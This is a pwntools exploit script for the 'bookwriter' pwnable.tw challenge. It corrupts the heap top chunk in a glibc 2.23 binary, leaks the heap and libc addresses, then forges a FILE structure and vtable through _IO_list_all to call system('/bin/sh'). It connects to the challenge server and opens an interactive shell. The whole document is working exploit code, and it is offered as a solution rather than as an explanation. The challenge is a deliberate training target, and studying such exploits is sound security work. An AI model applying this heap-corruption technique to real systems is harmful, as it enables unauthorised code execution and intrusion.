#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./bookwriter_patched', checksec=False)
libc = ELF('./libc_64.so.6',checksec=False)
ld = ELF('./ld-2.23.so',checksec=False)

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x400881
                b*0x4009f3
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.pwnable.tw', 10304)
else:
        p = process(exe.path)


def author(name):
        sla(b'Author :',name)

def add(size,data):
        sla(b'choice :',b'1')
        sla(b'page :',str(size))
        sa(b'Content :',data)

def view(idx):
        sla(b'choice :',b'2')
        sla(b'page :',str(idx))

def edit(idx,data):
        sla(b'choice :',b'3')
        sla(b'page :',str(idx))
        sa(b'Content:',data)

def show():
        sla(b'choice :',b'4')


author(b'a'*60 + b'hlan')

add(0x18,b'aaaa')
edit(0,b'b'*0x18)
edit(0,b'\0'*0x18 + b'\xe1\x0f\x00')

show()

p.recvuntil(b'hlan')
heap_leak = u64(p.recvline()[:-1].ljust(8,b'\0'))
heap_base = heap_leak - 0x10

info("heap leak: " + hex(heap_leak))
info("heap base: " + hex(heap_base))

sla(') ','0')

add(0x78,b'a'*8)
view(1)
p.recvuntil('\naaaaaaaa')
libc_leak = u64(p.recvuntil(b'\n',drop=True).ljust(8,b'\x00'))
libc.address = libc_leak - 1640 - libc.symbols['__malloc_hook']  -0x10
system = libc.symbols['system']
io_list_all = libc.symbols['_IO_list_all']
info('libc leak: ' + hex(libc_leak))
info('libc base: ' + hex(libc.address))

for i in range(7):
    add(0x18,b'bbbb')

pad = b'\x00' * 0x170
payload = b'/bin/sh\x00' + p64(0x61) + p64(0xdeadbeef) 
payload += p64(io_list_all - 0x10) + p64(2) + p64(3)
payload = payload.ljust(0xc0,b'\x00') + p64(0xffffffffffffffff)
payload = payload.ljust(0xd8,b'\x00')
vtable = p64(0) * 3 + p64(system)
vtable_addr = heap_base + 0x180 + 0xe0
payload += p64(vtable_addr) + vtable
edit(0,pad+payload)
GDB()

p.recvuntil('Your choice :')
p.sendline(b'1')
p.recvuntil('Size of page :')
p.sendline(b'20')

p.interactive()